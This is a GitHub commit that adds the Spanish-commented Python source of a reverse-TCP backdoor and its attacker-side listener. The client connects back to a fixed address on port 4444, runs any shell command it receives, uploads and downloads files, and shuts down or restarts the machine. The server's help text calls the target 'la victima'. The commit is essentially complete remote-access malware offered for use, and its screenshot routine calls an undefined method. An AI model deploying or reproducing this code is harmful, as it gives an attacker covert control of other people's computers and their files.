58b28f6d9c292372bf356ddb5a227a1f93282634
JkDev <69984125+JkDevArg@users.noreply.github.com>
2022-01-24 02:02:42 -0500

    Add files via upload

---
+++ reverse_tcp_4444.py
@@ -0,0 +1,123 @@
+#!/usr/bin/env python
+import socket
+import subprocess
+import json
+import os
+import time
+import base64
+import sys
+import shutil
+import pymsgbox
+import platform
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_system_command(self, command):
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+
+    def os(self):
+        operating_system = platform.platform()
+        return "[+] Sistema Operativo: " + operating_system
+
+    def dir(self, path):
+        os.chdir(path)
+        return "[+] Cambiando directorio a " + path
+
+    def descargar(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def subir(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Subido Correctamente."
+
+    def captura(self):
+        img = self.grab(childprocess=False)
+        filename = os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S') + '.png')
+        img.save(filename)
+        return '[+] Captura guardada como: ' + filename
+
+    def ip(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        return "[+] Local IP: " + ip
+
+    def host(self):
+        host = socket.gethostname()
+        return "[+] Nombre PC: " + host
+
+    def apagar(self):
+        os.system('shutdown /s /t 1')
+        return '[+] Apagando Sistema'
+
+    def reiniciar(self):
+        os.system('shutdown /r /t 1')
+        return '[+] Reiniciando el sistema'
+
+    def alerta(self):
+        texto_alerta =input('Texto Alerta: ')
+        titulo_alerta = input('Titulo Alerta: ')
+        boton_txt_alerta = input('Texto del Boton Alerta: ')
+
+        pymsgbox.alert(text=texto_alerta, title=titulo_alerta, button=boton_txt_alerta)
+        return '[+] Alerta enviada'
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "os":
+                    res_comando = self.os()
+                elif command[0] == "cd" and len(command) > 1:
+                    res_comando = self.dir(command[1])
+                elif command[0] == "descargar":
+                    res_comando = self.descargar(command[1])
+                elif command[0] == "subir":
+                    res_comando = self.subir(command[1], command[2])
+                elif command[0] == "captura":
+                    res_comando = self.captura()
+                elif command[0] == "ip":
+                    res_comando = self.ip()
+                elif command[0] == "host":
+                    res_comando = self.host()
+                elif command[0] == "apagar":
+                    res_comando = self.apagar()
+                elif command[0] == "reiniciar":
+                    res_comando = self.reiniciar()
+                elif command[0] == "alerta":
+                    res_comando = self.alerta()
+                else:
+                    res_comando = self.execute_system_command(command)
+            except Exception as e:
+                res_comando = "[-] Error al ejecutar el comando."
+
+            self.reliable_send(res_comando)
+
+
+try:
+    my_backdoor = Backdoor("192.168.1.6", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
---
+++ tcp_server.py
@@ -0,0 +1,104 @@
+#!/usr/bin/python
+import socket
+import json
+import base64
+
+def banner():
+    print("""                                                                             
+ _______    ______    ______   __    __  _______    ______    ______   _______   
+|       \  /      \  /      \ |  \  /  \|       \  /      \  /      \ |       \  
+| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$ /  $$| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$\ 
+| $$__/ $$| $$__| $$| $$   \$$| $$/  $$ | $$  | $$| $$  | $$| $$  | $$| $$__| $$ 
+| $$    $$| $$    $$| $$      | $$  $$  | $$  | $$| $$  | $$| $$  | $$| $$    $$ 
+| $$$$$$$\| $$$$$$$$| $$   __ | $$$$$\  | $$  | $$| $$  | $$| $$  | $$| $$$$$$$\ 
+| $$__/ $$| $$  | $$| $$__/  \| $$ \$$\ | $$__/ $$| $$__/ $$| $$__/ $$| $$  | $$ 
+| $$    $$| $$  | $$ \$$    $$| $$  \$$\| $$    $$ \$$    $$ \$$    $$| $$  | $$ 
+ \$$$$$$$  \$$   \$$  \$$$$$$  \$$   \$$ \$$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$ 
+                                                                                 
+                                                                                 
+            Tool by JkDevArg                                                                     
+
+    """)
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Esperanco conexión")
+        self.connection, address = listener.accept()
+        print("[+] Conexión desde:" + str(address))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_remotely(self, command):
+        self.reliable_send(command)
+
+        if command[0] == "salir":
+            self.connection.close()
+            exit()
+
+        return self.reliable_receive()
+
+    def descargar(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Descarga Completa."
+
+    def subir(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def ayuda(self):
+        print('[#] ¡Lista de Información!\n') 
+        print("--- Ayuda General ---") 
+        print('[>] os | Muestra el sistema operativo)') 
+        print('[>] cd | Cambia el directorio') 
+        print('[>] ip | Muestra la IP local') 
+        print('[>] host | Muestra el nombre del equipo') 
+        print('[>] apagar | Apaga la PC de la victima') 
+        print('[>] reiniciar | Hace que el equipo de destino se reinicie') 
+        print('[>] descargar | Descarga el archivo cualquier archivo') 
+        print('[>] subir | Carga cualquier archivo') 
+        print('[>] captura de pantalla\n')
+
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            command = command.split(" ")
+
+            try:
+                if command[0] == "subir":
+                    file_content = self.subir(command[1])
+                    command.append(file_content)
+
+                resultado = self.execute_remotely(command)
+
+                if command[0] == "descargar" and "[-] Error " not in resultado:
+                    resultado = self.descargar(command[1], resultado)
+
+                if command[0] == "ayuda":
+                    self.ayuda()
+
+            except Exception:
+                resultado = "[-] Error al ejecutar comando."
+
+            print(resultado)
+
+
+banner()
+my_listener = Listener("192.168.1.6", 4444)
+my_listener.run()
